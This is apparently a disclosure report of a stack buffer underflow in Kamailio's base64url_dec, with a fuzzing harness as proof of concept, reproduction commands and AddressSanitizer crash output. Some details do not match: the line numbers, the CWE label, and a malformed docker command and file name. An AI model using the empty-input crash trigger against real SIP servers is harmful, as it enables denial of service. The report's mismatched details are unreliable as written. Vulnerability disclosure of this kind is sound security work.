# Vulnerability Report: Stack Buffer Underflow in Kamailio `base64url_dec` Function

## 1. Summary

A stack-based buffer underflow vulnerability was discovered in the `base64url_dec` function of Kamailio’s core source code. The issue occurs when the function processes an input string with a length of zero or less, causing the application to attempt to read memory preceding the allocated stack buffer. This can lead to a crash (Denial of Service) or potential information leakage.

## 2. Affected Product & Component

  * **Product:** Kamailio (Open Source SIP Server)
  * **Component:** Core
  * **File Path:** `/src/kamailio/src/core/basex.c`
  * **Affected Function:** `base64url_dec`
  * **Vulnerability Type:** CWE-121: Stack-based Buffer Overflow

## 3. Technical Analysis

### Root Cause

The vulnerability exists due to improper validation of the input length parameter (`ilen`) before it is used to initialize a loop index.

In `src/core/basex.c`, the `base64url_dec` function contains the following logic to handle padding characters ('='):

```c
// Line 476 in basex.c
for(n = 0, i = ilen - 1; in[i] == '='; i--)
    n++;
```

The variable `i` is initialized to `ilen - 1`. The code fails to check if `ilen` is greater than 0.

  * **Scenario:** If `ilen` is `0` (or negative), `i` is initialized to `-1`.
  * **Consequence:** The condition `in[i] == '='` evaluates `in[-1]`. This accesses memory located immediately before the `in` buffer on the stack.

### Crash Details

  * **Error:** AddressSanitizer: stack-buffer-underflow
  * **Read Access:** `0x7f0cbad7081f` (located at offset 31 in the stack frame, underflowing the variable `in`)
  * **Trigger:** Calling `base64url_dec` with an empty input buffer (`ilen = 0`).

## 4. Impact

  * **Denial of Service (DoS):** Accessing invalid memory addresses can cause the Kamailio process to crash, disrupting service.


## 5. Proof of Concept (PoC)

The following harness demonstrates how to trigger the vulnerability:

```c
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>

int base64url_dec(const char *in, int ilen, char *out, int osize);

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    size_t copy_len = Size;

    if (copy_len > 256) copy_len = 256;

    char in[256] = {0};
    memcpy(in, Data, copy_len);

    char out[256] = {0};

    int decoded_len = base64url_dec(in, (int)copy_len, out, (int)sizeof(out));

    return 0;
}

```

## 6. How to Reproduce
```bash
docker run -it --rm gcr.io/oss-fuzz/kamailio /bin/bash -v /path/to/base64url_dec-output-1.c:/
export LIB_FUZZING_ENGINE="-fsanitize=fuzzer"
cp base64url_dec-output-1.c.c /src/kamailio/misc/fuzz/fuzz_uri.c
cd /src/kamailio && bash ../build.sh
cd /out && ./fuzz_uri
```
## 7. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/kamailio/corpus/base64url_dec-output-1-regen3/fuzz_uri:/tmp/fuzz_uri_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/base64url_dec-output-1-regen3:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer fuzz_uri -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/fuzz_uri_corpus': Device or resource busy
/out/fuzz_uri -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/fuzz_uri_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 4207987115
INFO: Loaded 1 modules   (91067 inline 8-bit counters): 91067 [0x55f2e45e8168, 0x55f2e45fe523), 
INFO: Loaded 1 PC tables (91067 PCs): 91067 [0x55f2e45fe528,0x55f2e47620d8), 
INFO:        0 files found in /tmp/fuzz_uri_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
=================================================================
==12==ERROR: AddressSanitizer: stack-buffer-underflow on address 0x7f0cbad7081f at pc 0x55f2e3a689d4 bp 0x7ffde628dbb0 sp 0x7ffde628dba8
READ of size 1 at 0x7f0cbad7081f thread T0
SCARINESS: 27 (1-byte-read-stack-buffer-underflow)
    #0 0x55f2e3a689d3 in base64url_dec /src/kamailio/src/core/basex.c:536:27
    #1 0x55f2e3a64cf7 in LLVMFuzzerTestOneInput /src/kamailio/./misc/fuzz/fuzz_uri.c:22:23
    #2 0x55f2e3919690 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #3 0x55f2e391aba1 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:807:3
    #4 0x55f2e391b132 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:867:3
    #5 0x55f2e390a26b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #6 0x55f2e3935642 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #7 0x7f0cbb1c1082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #8 0x55f2e38fcaed in _start (/out/fuzz_uri+0x37aaed)

DEDUP_TOKEN: base64url_dec--LLVMFuzzerTestOneInput--fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)
Address 0x7f0cbad7081f is located in stack of thread T0 at offset 31 in frame
    #0 0x55f2e3a64b2f in LLVMFuzzerTestOneInput /src/kamailio/./misc/fuzz/fuzz_uri.c:9

DEDUP_TOKEN: LLVMFuzzerTestOneInput
  This frame has 2 object(s):
    [32, 288) 'in' (line 16) <== Memory access at offset 31 underflows this variable
    [352, 608) 'out' (line 19)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-underflow /src/kamailio/src/core/basex.c:536:27 in base64url_dec
Shadow bytes around the buggy address:
  0x7f0cbad70580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7f0cbad70800: f1 f1 f1[f1]00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70900: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00
  0x7f0cbad70980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f0cbad70a00: 00 00 00 00 00 00 00 00 00 00 00 00 f3 f3 f3 f3
  0x7f0cbad70a80: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==12==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000


artifact_prefix='./'; Test unit written to ./crash-da39a3ee5e6b4b0d3255bfef95601890afd80709
Base64: 
stat::number_of_executed_units: 1
stat::average_exec_per_sec:     0
stat::new_units_added:          0
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              38
```

